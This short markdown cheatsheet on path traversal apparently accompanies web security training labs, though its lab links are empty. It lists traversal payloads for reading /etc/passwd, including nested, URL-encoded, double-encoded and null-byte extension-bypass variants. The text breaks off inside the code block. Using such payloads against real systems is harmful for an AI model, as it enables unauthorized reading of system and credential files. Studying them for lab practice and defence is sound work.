# Path Traversal - CHEATSHEET + LABS

## Walkthrough - Most important labs

- [1]()

- [2]()

## CHEATSHEET

```bash
#null byte = \0 -> %00
../../../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd 
/var/www/../../../etc/passwd
../../../../../etc/passwd%00.jpg # bypass extension  via byte null

